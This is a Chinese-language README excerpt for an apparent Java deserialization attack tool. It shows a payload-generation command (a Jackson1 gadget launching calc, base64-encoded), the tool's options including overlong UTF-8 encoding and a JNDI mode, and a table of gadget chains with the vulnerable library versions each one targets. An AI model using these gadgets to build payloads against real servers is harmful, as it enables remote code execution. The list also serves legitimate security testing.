

## Payload Mode

可以使用`-m payload`来使用payload模式，这个模式下会生成自定义的反序列化payload，例如

```
java -jar ysogate-[version]-all.jar -m payload -g Jackson1 -p calc -b64
```

完整用法如下

```bash
[root]#~  H4cking to the Gate !
[root]#~  Usage:
[root]#~  Payload Mode: java -jar ysogate-[version]-all.jar -m payload [PAYLOAD OPTIONS]
[root]#~  JNDI Mode:    java -jar ysogate-[version]-all.jar -m jndi [JNDI OPTIONS]

[root]#~  Payload Mode Options:
 -b64,--base64           Encode Output into base64
 -f,--file <arg>         Write Output into FileOutputStream (Specified FileName)
 -g,--gadget <arg>       Java deserialization gadget
 -h,--help               Show help message
 -m,--mode <arg>         Operation mode: 'payload' or 'jndi'
 -ol,--overlong          Use overlong UTF-8 encoding
 -p,--parameters <arg>   Gadget parameters


[root]#~  Available payload types:
00:40:55.537 [main] INFO org.reflections.Reflections - Reflections took 63 ms to scan 1 urls, producing 22 keys and 233 values
     Payload                                     Dependencies                                                                                                                                                                                        
     -------                                     ------------                                                                                                                                                                                        
     AspectJWeaver                               aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     AspectJWeaver2                              aspectjweaver:1.9.2, commons-collections:3.2.2                                                                                                                                                      
     BeanShell1                                  bsh:2.0b5                                                                                                                                                                                           
     BeanShell20b4                               bsh:2.0b4                                                                                                                                                                                           
     C3P0                                        c3p0:0.9.5.2, mchange-commons-java:0.2.11                                                                                                                                                           
     C3P02                                       c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35                                                                                                                                            
     C3P03                                       c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, groovy:2.3.9                                                                                                                              
     C3P04                                       c3p0:0.9.5.2, mchange-commons-java:0.2.11, tomcat:8.5.35, snakeyaml:1.30                                                                                                                            
     C3P092                                      c3p0:0.9.2-pre2-RELEASE ~ 0.9.5-pre8, mchange-commons-java:0.2.11                                                                                                                                   
     Click1                                      click-nodeps:2.3.0, javax.servlet-api:3.1.0                                                                                                                                                         
     Clojure                                     clojure:1.8.0                                                                                                                                                                                       
     CommonsBeanutils1                           commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
     CommonsBeanutils1183NOCC                    commons-beanutils:1.8.3                                                                                                                                                                             
     CommonsBeanutils2                           commons-beanutils:1.9.2                                                                                                                                                                             
     CommonsBeanutils2183NOCC                    commons-beanutils:1.8.3, commons-logging:1.2                                                                                                                                                        
     CommonsBeanutils3                           commons-beanutils:1.9.2, commons-collections:3.1                                                                                                                                                    
     CommonsBeanutils3183                        commons-beanutils:1.9.2, commons-collections:3.1, commons-logging:1.2                                                                                                                               
     CommonsBeanutils4                           commons-beanutils:1.9.2, commons-collections:3.1                                                                                                                                                    
     CommonsBeanutilsAttrCompare                 commons-beanutils:1.9.2                                                                                                                                                                             
     CommonsBeanutilsAttrCompare183              commons-beanutils:1.8.3                                                                                                                                                                             
     CommonsBeanutilsObjectToStringComparator    commons-beanutils:1.9.2, commons-lang3:3.10                                                                                                                                                         
     CommonsBeanutilsObjectToStringComparator183 commons-beanutils:1.8.3, commons-lang3:3.10                                                                                                                                                         
     CommonsBeanutilsPropertySource              commons-beanutils:1.9.2, log4j-core:2.17.1                                                                                                                                                          
     CommonsBeanutilsPropertySource183           commons-beanutils:1.9.2, log4j-core:2.17.1                                                                                                                                                          
     CommonsCollections1                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections10                        commons-collections:3.2.1                                                                                                                                                                           
     CommonsCollections11                                                                                                                                                                                                                            
     CommonsCollections12                        commons-collections:3.2.1                                                                                                                                                                           
     CommonsCollections2                         commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections3                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections4                         commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections5                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections6                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections6Lite                     commons-collections:3.1                                                                                                                                                                             
     CommonsCollections7                         commons-collections:3.1                                                                                                                                                                             
     CommonsCollections8                         commons-collections4:4.0                                                                                                                                                                            
     CommonsCollections9                         commons-collections:3.2.1                                                                                                                                                                           
     CommonsCollectionsK1                        commons-collections:<=3.2.1                                                                                                                                                                         
     CommonsCollectionsK2                        commons-collections4:4.0                                                                                                                                                                            
     Fastjson1                                   <=1.2.xx                                                                                                                                                                                            
     Fastjson2                                   <=2.0.26?                                                                                                                                                                                           
     FileUpload1                                 commons-fileupload:1.3.1, commons-io:2.4                                                                                                                                                            
     Groovy1                                     groovy:2.3.9                                                                                                                                                                                        
     Hibernate1                                  hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1                                                                                     
     Hibernate2                                  hibernate-core:4.3.11.Final, aopalliance:1.0, jboss-logging:3.3.0.Final, javax.transaction-api:1.2, dom4j:1.6.1                                                                                     
     JBossInterceptors1                          javassist:3.12.1.GA, jboss-interceptor-core:2.0.0.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                            
     JRE8u20                                                                                                                                                                                                                                         
     JRE8u20_2                                                                                                                                                                                                                                       
     JRMPClient                                                                                                                                                                                                                                      
     JRMPClient_Activator                                                                                                                                                                                                                            
     JRMPClient_Obj                                                                                                                                                                                                                                  
     JRMPListener                                                                                                                                                                                                                                    
     JSON1                                       json-lib:jar:jdk15:2.4, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2, commons-lang:2.6, ezmorph:1.0.6, commons-beanutils:1.9.2, spring-core:4.1.4.RELEASE, commons-collections:3.1
     Jackson1                                    jackson-databind:2.14.2, spring-aop:4.1.4.RELEASE                                                                                                                                                   
     Jackson2                                    jackson-databind:2.14.2, spring-aop:4.1.4.RELEASE                                                                                                                                                   
     JavassistWeld1                              javassist:3.12.1.GA, weld-core:1.1.33.Final, cdi-api:1.0-SP1, javax.interceptor-api:3.1, jboss-interceptor-spi:2.0.0.Final, slf4j-api:1.7.21                                                        
     Jdk7u21                                                                                                                                                                                                                                         
     Jdk7u21variant                                                                                                                                                                                                                                  
     Jython1                                     jython-standalone:2.5.2                                                                                                                                                                             
     MozillaRhino1                               js:1.7R2                                                                                                                                                                                            
     MozillaRhino2                               js:1.7R2                                                                                                                                                                                            
     Myfaces1                                                                                                                                                                                                                                        
     Myfaces2                                    myfaces-impl:2.2.9, myfaces-api:2.2.9, apache-el:8.0.27, javax.servlet-api:3.1.0, mockito-core:1.10.19, hamcrest-core:1.1, objenesis:2.1                                                            
     ROME                                        rome:1.0                                                                                                                                                                                            
     ROME2                                       rome:1.0                                                                                                                                                                                            
     ROME3                                       rome:1.0                                                                                                                                                                                            
     SignedObject                                                                                                                                                                                                                                    
     Spring1                                     spring-core:4.1.4.RELEASE, spring-beans:4.1.4.RELEASE                                                                                                                                               
     Spring2                                     spring-core:4.1.4.RELEASE, spring-aop:4.1.4.RELEASE, aopalliance:1.0, commons-logging:1.2                                                                                                           
     Spring3                                     spring-tx:5.2.3.RELEASE, spring-context:5.2.3.RELEASE, javax.transaction-api:1.2                                                                                                                    
     URLDNS                                                                                                                                                                                                                                          
     Vaadin1                                     vaadin-server:7.7.14, vaadin-shared:7.7.14                                                                                                                                                          
     Wicket1                                     wicket-util:6.23.0, slf4j-api:1.6.4                                                                                                                                                                 
     XStream39144                                Xstream:<1.4.18                                                                                                                                                                                     
     XStream39149                                Xstream:<1.4.18                                                                                                                                                                                     

```
